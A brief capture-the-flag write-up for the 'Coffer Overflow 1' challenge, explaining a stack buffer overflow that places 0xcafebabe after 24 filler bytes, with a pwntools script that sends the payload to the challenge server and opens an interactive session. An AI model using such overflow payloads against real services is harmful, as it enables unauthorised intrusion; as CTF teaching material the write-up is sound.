# Coffer Overflow 1
Just like `Coffer Overflow 0`, we have to overflow, but this time we have to make the comparison true. `0xcafebabe` is compared to the 4 bytes after the first 24.

```python
from pwn import *

p = remote('2020.redpwnc.tf', 31255)

p.clean(0.2)
p.sendline(b'a' * 24 + p32(0xcafebabe))
p.interactive()
```